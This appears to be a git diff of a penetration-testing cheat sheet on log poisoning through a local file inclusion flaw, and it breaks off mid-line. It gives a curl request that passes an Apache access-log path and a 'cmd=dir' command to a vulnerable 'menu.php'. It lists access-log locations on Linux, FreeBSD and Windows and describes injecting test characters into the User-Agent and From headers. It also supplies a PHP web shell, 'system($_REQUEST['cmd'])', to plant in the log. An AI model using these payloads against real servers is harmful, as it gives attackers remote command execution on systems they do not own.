@@ -17,16 +17,40 @@ Vulnerable parameter `?file=` and  `&cmd`
 curl "http://$poor_web_server/menu.php?file=c:\xampp\apache\logs\access.log&cmd=dir"
 ```
 
-
 ## Log File Locations:
+
+To perform log poisoning we require a log file to poison. 
 
 Linux
 ```bash
 /var/log/apache/access.log
 /var/log/apache2/access.log
 /var/log/httpd/access.log
+# FreeBSD
+/var/log/httpd-access.log
 ```
 Windows
 ```
 C:\xampp\apache\logs\access.log
 ```
+
+## Located Controllable Log Fields
+
+Use Burpsuite ([[Burpsuite-Helpsheet]]) or combination of curl([[Curl-Cheatsheet]]) modifying the various possible fields contained in the log. 
+
+```
+# Test Symbol filtering 
+User-Agent: Add your testing message here" 
+```
+Test Symbol filtering most importantly the quotation escaping like the above.
+```
+# From: !@#$%$^&*()"':;<>,.?/`~ 
+```
+
+Controlling a modifiable field then leads to test whether the server or website language can execute code from this log file.  Beware of server side language handling the code. Notably if you see (for example `<?php`) script tags and the following executable code then there this code is not being passed to a function  that can execute the code.  
+
+```php
+<?php system($_REQUEST['cmd']); ?>
+```
+
+`url:/path/to/log/logname.log&cmd=
